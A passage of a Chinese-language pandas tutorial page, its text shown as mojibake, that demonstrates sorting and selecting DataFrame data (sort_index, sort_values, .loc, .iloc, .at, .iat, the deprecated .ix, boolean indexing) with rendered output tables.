<td>test</td>      <td>train</td>    </tr>    <tr>      <th>F</th>      <td>foo</td>      <td>foo</td>      <td>foo</td>      <td>foo</td>    </tr>  </tbody></table></div><p>æŒ‰ç…§æŸä¸€åæ ‡è½´è¿›è¡Œæ’åº</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>sort_index<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment"># é™åº</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>D</th>      <th>C</th>      <th>B</th>      <th>A</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.526823</td>      <td>0.743378</td>      <td>0.712521</td>      <td>-0.228084</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>0.080931</td>      <td>-2.318931</td>      <td>0.564346</td>      <td>-0.423923</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-0.365556</td>      <td>1.176614</td>      <td>2.046827</td>      <td>-2.032243</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>1.068642</td>      <td>-1.527804</td>      <td>1.109991</td>      <td>-1.200005</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-1.074013</td>      <td>0.907865</td>      <td>1.351420</td>      <td>-0.535031</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.333819</td>      <td>-0.420875</td>      <td>0.027143</td>      <td>-0.614734</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>sort_index<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># å‡åºï¼ˆé»˜è®¤ï¼‰</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>sort_index<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¥ç¬¬0è½´ï¼ˆè¡Œï¼‰æ¥æ’åºï¼Œé™åº</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>  </tbody></table></div><p>æŒ‰å€¼è¿›è¡Œæ’åºï¼Œé»˜è®¤ä¸ºå‡åº</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">'B'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>  </tbody></table></div><h2 id="0x04-é€‰æ‹©æ•°æ®-Selection"><a href="#0x04-é€‰æ‹©æ•°æ®-Selection" class="headerlink" title="0x04 é€‰æ‹©æ•°æ® Selection"></a>0x04 é€‰æ‹©æ•°æ® Selection</h2><blockquote><p><strong>æ³¨æ„ï¼š</strong> è™½ç„¶æ ‡å‡†çš„ Python/Numpy çš„é€‰æ‹©å’Œè®¾ç½®è¡¨è¾¾å¼éƒ½éå¸¸æ˜“æ‡‚ä¸”æ–¹ä¾¿ç”¨äºäº¤äº’ä½¿ç”¨ï¼Œä½†æ˜¯ä½œä¸ºå·¥ç¨‹ä½¿ç”¨çš„ä»£ç ï¼Œæ¨èä½¿ç”¨ç»è¿‡ä¼˜åŒ–çš„ pandas æ•°æ®è®¿é—®æ–¹æ³•ï¼š <code>.at</code>, <code>.iat</code>, <code>.loc</code>, <code>.iloc</code> å’Œ <code>.ix</code>ã€‚</p></blockquote><h3 id="0x04-1-è·å–-Getting"><a href="#0x04-1-è·å–-Getting" class="headerlink" title="0x04-1 è·å– Getting"></a>0x04-1 è·å– Getting</h3><p>é€‰æ‹©ä¸€ä¸ªå•ç‹¬çš„åˆ—ï¼Œè¿™å°†ä¼šè¿”å›ä¸€ä¸ª <code>Series</code>ï¼Œç­‰æ•ˆäº <code>df.A</code></p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>2020-04-16   -0.2280842020-04-17   -0.4239232020-04-18   -2.0322432020-04-19   -1.2000052020-04-20   -0.5350312020-04-21   -0.614734Freq: D, Name: A, dtype: float64</code></pre><p> é€šè¿‡<code>[]</code>è¿›è¡Œé€‰æ‹©ï¼Œå¯ä»¥ç”¨æ¥è¡Œè¿›è¡Œåˆ‡ç‰‡(slice)</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'20200418'</span><span class="token punctuation">:</span><span class="token string">'20200420'</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>  </tbody></table></div><h3 id="0x4-2-é€šè¿‡æ ‡ç­¾é€‰æ‹©-Selection-by-Label"><a href="#0x4-2-é€šè¿‡æ ‡ç­¾é€‰æ‹©-Selection-by-Label" class="headerlink" title="0x4-2 é€šè¿‡æ ‡ç­¾é€‰æ‹© Selection by Label"></a>0x4-2 é€šè¿‡æ ‡ç­¾é€‰æ‹© Selection by Label</h3><p><strong>åˆ©ç”¨ pandas çš„ <code>.loc</code>, <code>.at</code> æ–¹æ³•</strong></p><p>ä½¿ç”¨æ ‡ç­¾æ¥è·å–ä¸€ä¸ªäº¤å‰çš„åŒºåŸŸ</p><pre class="language-python" data-language="python"><code class="language-python">dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></code></pre><pre><code>Timestamp('2020-04-16 00:00:00', freq='D')</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre><code>A   -0.228084B    0.712521C    0.743378D    0.526823Name: 2020-04-16 00:00:00, dtype: float64</code></pre><p>ç”¨æ ‡ç­¾æ¥åœ¨å¤šä¸ªè½´ä¸Šè¿›è¡Œé€‰æ‹©</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>    </tr>  </tbody></table></div><p>åˆ©ç”¨æ ‡ç­¾æ¥åˆ‡ç‰‡</p><p>æ³¨æ„æ­¤å¤„çš„åˆ‡ç‰‡<strong>ä¸¤ç«¯éƒ½åŒ…å«ï¼ˆå·¦é—­å³é—­ï¼‰</strong></p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'20200418'</span><span class="token punctuation">:</span><span class="token string">'20200420'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token string">'C'</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>    </tr>  </tbody></table></div><p>å¯¹äºè¿”å›çš„å¯¹è±¡è¿›è¡Œç»´åº¦ç¼©å‡</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'20200419'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre><code>A   -1.200005B    1.109991Name: 2020-04-19 00:00:00, dtype: float64</code></pre><p>è·å–ä¸€ä¸ªæ ‡é‡</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>-2.0322429408627056</code></pre><p>å¿«é€Ÿè®¿é—®ä¸€ä¸ªæ ‡é‡ï¼ˆä¸ä¸Šä¸€ä¸ªæ–¹æ³•ç­‰ä»·ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>at<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>-2.0322429408627056</code></pre><h3 id="0x04-3-é€šè¿‡ä½ç½®è¿›è¡Œé€‰æ‹©-Selection-by-Position"><a href="#0x04-3-é€šè¿‡ä½ç½®è¿›è¡Œé€‰æ‹©-Selection-by-Position" class="headerlink" title="0x04-3 é€šè¿‡ä½ç½®è¿›è¡Œé€‰æ‹© Selection by Position"></a>0x04-3 é€šè¿‡ä½ç½®è¿›è¡Œé€‰æ‹© Selection by Position</h3><p><strong>åˆ©ç”¨çš„æ˜¯ pandas é‡Œçš„ <code>.iloc</code>, <code>.iat</code> æ–¹æ³•</strong></p><p>é€šè¿‡ä¼ é€’æ•´æ•°å€¼è¿›è¡Œä½ç½®é€‰æ‹©</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> </code></pre><pre><code>A   -1.200005B    1.109991C   -1.527804D    1.068642Name: 2020-04-19 00:00:00, dtype: float64</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment"># [è¡Œï¼Œåˆ—] æˆ– [ç¬¬0ç»´ï¼Œç¬¬1ç»´]</span></code></pre><pre><code>2020-04-16    0.7433782020-04-17   -2.3189312020-04-18    1.1766142020-04-19   -1.5278042020-04-20    0.9078652020-04-21   -0.420875Freq: D, Name: C, dtype: float64</code></pre><p>åˆ©ç”¨æ•°å€¼è¿›è¡Œåˆ‡ç‰‡ï¼Œç±»ä¼¼äº numpy/python</p><p><strong>æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œçš„åˆ‡ç‰‡æ˜¯æ™®é€šçš„åˆ‡ç‰‡ï¼Œå³å·¦é—­å³å¼€ã€‚</strong></p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>    </tr>  </tbody></table></div><p>å¯ä»¥æŒ‡å®šä¸€ä¸ªä½ç½®çš„åˆ—è¡¨æ¥é€‰æ‹©æ•°æ®åŒºåŸŸ</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>C</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>-2.318931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>1.176614</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>0.907865</td>    </tr>  </tbody></table></div><p>å¯¹è¡Œè¿›è¡Œåˆ‡ç‰‡</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>  </tbody></table></div><p>å¯¹åˆ—è¿›è¡Œåˆ‡ç‰‡</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>B</th>      <th>C</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.712521</td>      <td>0.743378</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>0.564346</td>      <td>-2.318931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>2.046827</td>      <td>1.176614</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>1.109991</td>      <td>-1.527804</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>1.351420</td>      <td>0.907865</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>0.027143</td>      <td>-0.420875</td>    </tr>  </tbody></table></div><p>åˆ©ç”¨ä½ç½®å¿«é€Ÿå¾—åˆ°ä¸€ä¸ªä½ç½®å¯¹åº”çš„å€¼</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><pre><code>0.5643462917985026</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>iat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><pre><code>0.5643462917985026</code></pre><h3 id="ix-ç”¨æ³•ï¼ˆDeprecatedï¼‰"><a href="#ix-ç”¨æ³•ï¼ˆDeprecatedï¼‰" class="headerlink" title=".ix ç”¨æ³•ï¼ˆDeprecatedï¼‰"></a>.ix ç”¨æ³•ï¼ˆDeprecatedï¼‰</h3><p><code>df.ix[]</code> æ—¢å¯ä»¥é€šè¿‡æ•´æ•°ç´¢å¼•è¿›è¡Œæ•°æ®é€‰å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ ‡ç­¾ç´¢å¼•è¿›è¡Œæ•°æ®é€‰å–ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>df.ix[]</code> æ˜¯ <code>df.loc[]</code> å’Œ <code>df.iloc[]</code> çš„åŠŸèƒ½é›†åˆï¼Œä¸”åœ¨åŒä¹‰è¯é€‰å–ä¸­ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨æ•´æ•°ç´¢å¼•å’Œæ ‡ç­¾ç´¢å¼•ã€‚</p><p>è¿™ä¸ªæ–¹æ³•åœ¨å®˜æ–¹çš„ <em>10 Minutes to pandas</em> ä¸­æ²¡æœ‰ä¸“é—¨è¯´æ˜ï¼Œ<strong>ä¸å»ºè®®ç”¨è¿™ä¸€æ–¹æ³•ï¼Œè¯·ç”¨<code>.loc</code>å’Œ<code>.iloc</code>æ¥ç´¢å¼•</strong>ï¼Œé‚£è¿™é‡Œå°±æä¸€ä¸‹å¥½äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>ix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>D:\Programs\Anaconda\lib\site-packages\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use.loc for label based indexing or.iloc for positional indexingSee the documentation here:http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated  """Entry point for launching an IPython kernel.-1.363418018143355</code></pre><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>ix<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre><code>D:\Programs\Anaconda\lib\site-packages\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use.loc for label based indexing or.iloc for positional indexingSee the documentation here:http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated  """Entry point for launching an IPython kernel.</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-11.332834</td>      <td>7.659436</td>      <td>-20.925183</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-11.040688</td>      <td>6.867701</td>      <td>-20.157355</td>    </tr>  </tbody></table></div><p>ä» DeprecationWarning çœ‹æ¥çš„ç¡®å·²ç» <strong>deprecated</strong> äº†ï¼Œé‚£å°±ä¸è¦ç”¨äº†ï¼</p><h3 id="0x04-4-å¸ƒå°”ç´¢å¼•-Boolean-Indexing"><a href="#0x04-4-å¸ƒå°”ç´¢å¼•-Boolean-Indexing" class="headerlink" title="0x04-4 å¸ƒå°”ç´¢å¼• Boolean Indexing"></a>0x04-4 å¸ƒå°”ç´¢å¼• Boolean Indexing</h3><p>ä½¿ç”¨ä¸€ä¸ªå•ç‹¬åˆ—çš„å€¼æ¥é€‰æ‹©æ•°æ®</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span>df<span class="token punctuation">.</span>D <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>  </tbody></table></div><p>åˆ©ç”¨<strong>å¸ƒå°”æ¡ä»¶</strong>ä»ä¸€ä¸ª DataFrame ä¸­é€‰æ‹©æ•°æ®</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token operator">&gt;</span><span class="token number">0</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>False</td>      <td>True</td>      <td>True</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>False</td>      <td>True</td>      <td>False</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>False</td>      <td>True</td>      <td>True</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>False</td>      <td>True</td>      <td>False</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>False</td>      <td>True</td>      <td>True</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>False</td>      <td>True</td>      <td>False</td>      <td>False</td>    </tr>  </tbody></table></div><pre class="language-python" 